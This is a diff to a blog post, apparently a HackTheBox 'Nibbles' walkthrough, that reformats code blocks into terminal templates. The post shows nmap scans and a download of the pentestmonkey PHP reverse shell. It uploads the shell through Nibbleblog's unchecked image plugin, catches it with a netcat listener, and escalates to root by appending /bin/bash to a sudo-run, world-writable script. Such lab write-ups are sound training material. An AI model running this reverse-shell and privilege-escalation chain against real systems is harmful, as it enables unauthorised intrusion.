@@ -27,8 +27,7 @@ Taking a nibble out of a vulnerable blog!
 
 Let's run an nmap scan to check for open ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/nibbles]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.75
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 00:07 AEDT
@@ -58,14 +57,17 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmap %}
 
 <br />
 Run a second nmap scan looking for any unusual ports.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/nibbles]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.75  
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 00:08 AEDT
@@ -77,22 +79,17 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=nmapfull %}
 
 <br />
 View the landing page and check the source.
 
-<div class="row justify-content-sm-center">
-    <div class="col-sm mt-3 mt-md-0">
-        {% include figure.liquid loading="eager" path="/assets/img/nibbles/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
-    </div>
-</div>
-
-{% raw %}
-```sh
-view-source:http://10.10.10.75/
-
+{% capture landingsource %}
 <b>Hello world!</b>
 
 
@@ -109,8 +106,17 @@ view-source:http://10.10.10.75/
 
 
 <!-- /nibbleblog/ directory. Nothing interesting here! -->
-```
-{% endraw %}
+{% endcapture %}
+
+<div class="row justify-content-sm-center">
+    <div class="col-sm mt-3 mt-md-0">
+        {% include figure.liquid loading="eager" path="/assets/img/nibbles/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
+    </div>
+</div>
+{% include terminal.html
+   language="browser"
+   title="view-source:http://10.10.10.75/"
+   content=landingsource %}
 
 <br />
 Check out the /nibbleblog/ directory.  There might be nothing interesting here but always good to double-check.
@@ -124,16 +130,16 @@ Check out the /nibbleblog/ directory.  There might be nothing interesting here b
 <br />
 Check the README file and get the version number.
 
-{% raw %}
-```sh
+{% capture readme %}
 ====== Nibbleblog ======
 Version: v4.0.3
 Codename: Coffee
 Release date: 2014-04-01
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include codebox.html title="README" content=readme %}
 
 <br />
 Navigate to the admin section of the blog.
@@ -178,8 +184,7 @@ Research nibbleblog and come across this repo with an exploit.
 <br />
 Download the pentestmonkey reverse php shell.
 
-{% raw %}
-```sh
+{% capture downloadthemonkey %}
 ┌──(kali㉿kali)-[~/Documents/htb/nibbles]
 └─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
 --2025-01-20 00:31:48--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
@@ -192,14 +197,17 @@ Saving to: ‘shell.php’
 shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      
 
 2025-01-20 00:31:48 (54.6 MB/s) - ‘shell.php’ saved [5491/5491]
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=downloadthemonkey %}
 
 <br />
 Update the code to use the HackTheBox IP and the attack listening port.
 
-{% raw %}
-```php
+{% capture ptmonkey %}
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
@@ -225,8 +233,12 @@ $debug = 0;
 <snip>
 
 ?>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="php"
+   title="shell.php"
+   content=ptmonkey %}
 
 <br />
 Reading through the exploit, it turns out that the My image plugin doesn't do an extension check when uploading and "image."
@@ -258,16 +270,17 @@ Save the changes.
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/nibbles]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
 listening on [any] 443 ...
+{% endcapture %}
 
-<snip>
-```
-{% endraw %}
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=startlistener %}
 
 <br />
 Navigate to the new "image" in the web browser.
@@ -281,8 +294,7 @@ Navigate to the new "image" in the web browser.
 <br />
 Check the listener and catch the shell.  Use python to upgrade the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/nibbles]
 └─$ sudo nc -nlvp 443
 [sudo] password for kali: 
@@ -297,14 +309,17 @@ $ python -c 'import pty; pty.spawn("/bin/bash")'
 /bin/sh: 1: python: not found
 $ python3 -c 'import pty; pty.spawn("/bin/bash");'
 nibbler@Nibbles:
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=catchshell %}
 
 <br />
 Run sudo -l to see a list of command that this user can run as sudo.
 
-{% raw %}
-```sh
+{% capture sudol %}
 nibbler@Nibbles:/$ sudo -l
 sudo -l
 Matching Defaults entries for nibbler on Nibbles:
@@ -313,14 +328,17 @@ Matching Defaults entries for nibbler on Nibbles:
 
 User nibbler may run the following commands on Nibbles:
     (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=sudol %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 nibbler@Nibbles:/home/nibbler$ cat user.txt
 cat user.txt
 <redacted>
@@ -340,52 +358,64 @@ ip a
        valid_lft 86400sec preferred_lft 14400sec
     inet6 fe80::250:56ff:feb9:1d9a/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=userflag %}
 
 <br />
 Unzip the personal.zip archive.
 
-{% raw %}
-```sh
+{% capture unziparchive %}
 nibbler@Nibbles:/home/nibbler$ unzip personal.zip
 unzip personal.zip
 Archive:  personal.zip
    creating: personal/
    creating: personal/stuff/
   inflating: personal/stuff/monitor.sh
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=unziparchive %}
 
 <br />
 Check the permissions of monitor.sh.  Turn out we can modify the file.  Most excellent.
 
-{% raw %}
-```sh
+{% capture checkperms %}
 nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
 ls -la
 total 12
 drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
 drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
 -rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=checkperms %}
 
 <br />
 Echo /bin/bash into the monitor.sh file.
 
-{% raw %}
-```sh
+{% capture overwritemonitor %}
 nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/bash' >> monitor.sh
 echo '/bin/bash' >> monitor.sh
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=overwritemonitor %}
 
 <br />
 Run the monitor.sh file with the sudo.
 
-{% raw %}
-```sh
+{% capture runmonitor %}
 nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
 <er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh             
 'unknown': I need something more specific.
@@ -393,25 +423,31 @@ nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/
 /home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
 /home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
 root@Nibbles:/home/nibbler/personal/stuff#
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=runmonitor %}
 
 <br />
 Run the whoami to confirm root.
 
-{% raw %}
-```sh
+{% capture confirmroot %}
 root@Nibbles:/home/nibbler/personal/stuff# whoami
 whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=confirmroot %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
 cat /root/root.txt
 <redacted>
@@ -431,8 +467,12 @@ ip a
        valid_lft 86399sec preferred_lft 14399sec
     inet6 fe80::250:56ff:feb9:1d9a/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html
+   language="bash"
+   title="bash"
+   content=rootflag %}
 
 <br />
 Looks like we got more than a nibble.  We got the whole machine.
